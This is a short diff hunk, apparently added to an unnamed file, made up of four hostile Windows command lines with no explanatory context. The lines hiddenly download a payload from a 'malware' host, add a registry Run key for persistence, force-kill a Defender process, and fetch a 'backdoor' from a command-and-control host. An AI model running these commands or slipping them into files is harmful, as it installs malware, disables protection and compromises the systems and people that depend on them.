@@ -1,0 +1,4 @@
+powershell -hidden wget http://malware.net/payload
+reg add HKLM\run /v evil /t REG_SZ /d c:\malware.exe
+taskkill /F /IM defender.exe
+curl -O http://c2.server/backdoor
